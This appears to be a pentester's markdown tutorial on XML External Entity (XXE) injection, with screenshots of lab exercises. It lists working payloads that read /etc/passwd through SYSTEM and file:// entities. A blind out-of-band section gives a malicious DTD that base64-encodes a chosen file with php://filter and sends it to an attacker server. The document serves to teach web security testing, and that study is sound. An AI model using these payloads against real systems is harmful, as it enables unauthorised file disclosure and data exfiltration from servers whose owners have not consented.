# XML External Entity Injection (XXE).
## ¿What is an XML Injection?
XML External Entity Injecton (XXE) it's a web vulnerability that allows an attacker to interfere in the XML data. <br />
Using this vulnerability we can see Files from the target system or interact with our own system via web server. <br />
Sometimes we can escalate an XXE to an [SSRF - Server Side Request Forgery](https://github.com/alejandro-pentest/Hacking-Web/tree/main/Server-side%20request%20forgery%20(SSRF)).

## XXE Exploitation.
If we fill and send the data, we can see that the parameter email is being outputed back by the server.<br />
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/9c7500e3-ad6b-404e-ab08-b3aad576e4fc" width="350">

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/5232d815-f5c9-4423-b751-2d7f422ee09a" width="800">


We have to check if we can also send the outup using the next method:<br />
```xml
<!DOCTYPE foo [<!ENTITY <Name> "<Value>"> ]>
```

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/f557d264-8ae4-4d03-b479-8f2fcaf13f52" width="800">


If the last command was useful we can now try to report critical files using Wrappers.<br />
```xml
<!DOCTYPE foo [<!ENTITY <Name> SYSTEM "/etc/passwd"> ]>
```

```xml
<!DOCTYPE foo [<!ENTITY <Name> SYSTEM "file:///etc/passwd"> ]>
```
<br /> 
<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/eac5fa56-da99-429f-9d50-4168c56bac44" width="800">


### Lab: Blind XXE with out-of-band interaction.
The first thing we can do is to check if we can connect to our server.
We can use the next line in the vulnerable xml.
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
```
![2](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/06cdbc88-48ab-4f97-a0d0-6ec76ce4a022)

After checking if we get the connection we have to create the file `malicious.dtd`.
```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=<fileToRead>">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM '<AttackerServer>/?x=%file;'>">
%eval;
%exfiltrate;
```

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
```

![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3)

<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d08deeba-67c9-49e3-bdd4-a29dde33e9be" width="600">

![5](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d08deeba-67c9-49e3-bdd4-a29dde33e9be)


![b642](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01b1ee23-a7a5-4cd0-addf-f626f9e1a75b)





